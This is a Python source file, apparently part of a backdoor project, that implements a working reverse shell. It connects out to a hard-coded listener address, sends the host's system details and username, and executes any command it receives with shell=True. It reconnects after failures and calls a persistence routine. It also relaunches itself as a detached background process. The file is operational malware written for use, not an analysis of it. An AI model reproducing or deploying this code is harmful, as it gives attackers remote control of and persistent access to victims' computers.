import socket
import os
import time
import threading
import sys
import subprocess
import platform
from Backdoor.persistence import establish_persistence

# Change these values to match your listener setup
SERVER_IP = "10.12.74.118"
SERVER_PORT = 3030


def get_system_info():
    """Get system information to send to the listener"""
    system = platform.system()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    username = os.getenv('USERNAME') or os.getenv('USER')

    return f"""
System: {system}
Release: {release}
Version: {version}
Machine: {machine}
User: {username}
Working Dir: {os.getcwd()}
"""


def reverse_shell():
    """Continuously try to connect, even if the listener stops and restarts."""
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, SERVER_PORT))

            s.send(get_system_info().encode())
            s.send(b"\nConnection established. Awaiting commands...\n")

            while True:
                cmd = s.recv(1024).decode()
                if not cmd:
                    break
                if cmd.lower() == "exit":
                    s.close()
                    return

                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except Exception as e:
                    s.send(f"Error executing command: {str(e)}".encode())

        except (ConnectionRefusedError, BrokenPipeError, OSError) as e:
            print(f"Connection failed: {e}")
            time.sleep(5)
        except Exception as e:
            print(f"Unexpected error: {e}")
            time.sleep(5)

def start_shell():
    """Start reverse shell in a thread."""
    # Only establish persistence if successfully connected
    establish_persistence()
    subprocess.Popen([sys.executable, os.path.abspath(__file__)], creationflags=subprocess.DETACHED_PROCESS)
    thread = threading.Thread(target=reverse_shell, daemon=True)
    thread.start()